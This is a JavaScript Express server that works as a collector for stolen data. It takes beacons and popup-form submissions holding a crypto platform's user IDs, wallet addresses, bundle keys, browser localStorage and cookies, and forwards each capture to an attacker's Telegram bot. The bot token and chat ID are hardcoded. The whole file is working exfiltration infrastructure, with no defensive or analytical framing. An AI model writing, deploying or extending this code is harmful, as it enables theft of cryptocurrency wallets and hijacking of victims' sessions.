const express = require('express');
const app = express();

// Support JSON and URL-encoded form data
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true, limit: '1mb' }));

const TELEGRAM_TOKEN = '8744030589:AAGZkvTlFfpfp9m_S0Rr6Rf3NpPmr46o76M';
const TELEGRAM_CHAT_ID = '8691443497';

async function sendTelegram(text) {
  try {
    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: text.substring(0, 4000),
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    console.error('Telegram send failed:', e.message);
  }
}

// Keepalive endpoint for cron-job.org
app.get('/data/keepalive', (req, res) => res.send('ok'));

// GET endpoint (for redirect or image beacon – kept for compatibility)
app.get('/data/:encoded', async (req, res) => {
  res.send('ok');
  try {
    const decoded = JSON.parse(Buffer.from(req.params.encoded, 'base64').toString('utf-8'));
    console.log('===== NEW CAPTURE (GET) =====');
    console.log(JSON.stringify(decoded, null, 2));

    let msg = buildMessage(decoded);
    await sendTelegram(msg);
  } catch (e) {
    console.error('Processing error:', e.message);
  }
});

// POST endpoint (used by the new popup form)
app.post('/collect', async (req, res) => {
  res.json({ status: 'ok' });
  try {
    // The popup sends data in the field "data" as a JSON string
    const decoded = JSON.parse(req.body.data);
    console.log('===== NEW CAPTURE (POST) =====');
    console.log(JSON.stringify(decoded, null, 2));

    let msg = buildMessage(decoded);
    await sendTelegram(msg);
  } catch (e) {
    console.error('Error:', e.message);
  }
});

function buildMessage(d) {
  let msg = '🔑 *New Axiom Capture*\n\n';
  if (d.user) {
    msg += '*User ID:* `' + (d.user.userId || 'N/A') + '`\n';
    msg += '*Wallet:* `' + (d.user.registrationWallet || 'N/A') + '`\n';
  }
  if (d.bundle) msg += '*Bundle Key:* `' + d.bundle + '`\n';
  if (d.wallets) {
    msg += '\n*Wallets:*\n';
    d.wallets.forEach((w, i) => msg += `  ${i + 1}. \`${w.walletAddress}\` (${w.network})\n`);
  }
  if (d.localStorage) {
    msg += '\n📦 *localStorage:*\n';
    for (const k in d.localStorage) {
      let v = d.localStorage[k];
      if (v.length > 200) v = v.substring(0, 200) + '...';
      msg += `\`${k}\`: ${v}\n`;
    }
  }
  if (d.cookies) {
    msg += '\n🍪 *Cookies:*\n```' + d.cookies.substring(0, 500) + '```';
  }
  return msg;
}

app.listen(10000, () => console.log('Collector running'));
